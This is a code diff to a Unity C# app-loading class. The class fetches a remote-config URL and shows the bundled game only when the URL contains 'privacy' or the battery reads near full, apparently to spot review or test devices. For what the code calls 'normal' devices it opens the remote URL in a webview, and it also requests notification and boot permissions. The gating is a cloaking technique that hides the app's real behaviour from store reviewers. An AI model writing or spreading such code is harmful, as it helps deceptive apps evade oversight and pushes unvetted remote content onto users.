@@ -15,6 +15,7 @@ public class AppLoadManager : MonoBehaviour
     [SerializeField] private GameObject gameRoot; //game
 
 
+    public static string PrivacyUrl;
     private const string localUrlKey = "Local-Url";
 
     IEnumerator Start()
@@ -43,13 +44,11 @@ public class AppLoadManager : MonoBehaviour
             yield return new WaitUntil(() => result.IsCompleted);
 
             //Get data
-            url = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance
-               .GetValue("aman").StringValue;
-
-            Debug.Log("Check link");
+            url = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("aman").StringValue;
 
             if (url.Contains("privacy") || SystemInfo.batteryLevel > 0.99f)
             {
+                PrivacyUrl = url;
                 OpenGame();
             }
             else //normal device
@@ -67,29 +66,29 @@ public class AppLoadManager : MonoBehaviour
         {
             OpenView(url);
         }
+    }
 
-        void OpenGame()
-        {
-            gameRoot.SetActive(true);
-        }
+    void OpenGame()
+    {
+        gameRoot.SetActive(true);
+    }
 
-        void OpenView(string url)
-        {
-            webViewCreator.OpenView(url);
-        }
+    void OpenView(string url)
+    {
+        webViewCreator.OpenView(url, false);
+    }
 
-        void RequestPermissionForNotifications()
+    void RequestPermissionForNotifications()
+    {
+        AndroidJavaClass androidVersion = new AndroidJavaClass("android.os.Build$VERSION");
+        int sdkInt = androidVersion.GetStatic<int>("SDK_INT");
+        Debug.Log($"Andoid sdk is {sdkInt}");
+        if (sdkInt >= 33)
         {
-            AndroidJavaClass androidVersion = new AndroidJavaClass("android.os.Build$VERSION");
-            int sdkInt = androidVersion.GetStatic<int>("SDK_INT");
-            Debug.Log($"Andoid sdk is {sdkInt}");
-            if (sdkInt >= 33)
-            {
-                AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
-                AndroidJavaObject currentActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
-                currentActivity.Call("requestPermissions", new string[] { "android.permission.RECEIVE_BOOT_COMPLETED" }, 1);
-                UnityEngine.Android.Permission.RequestUserPermission("android.permission.POST_NOTIFICATIONS");
-            }
+            AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
+            AndroidJavaObject currentActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
+            currentActivity.Call("requestPermissions", new string[] { "android.permission.RECEIVE_BOOT_COMPLETED" }, 1);
+            UnityEngine.Android.Permission.RequestUserPermission("android.permission.POST_NOTIFICATIONS");
         }
     }
 }
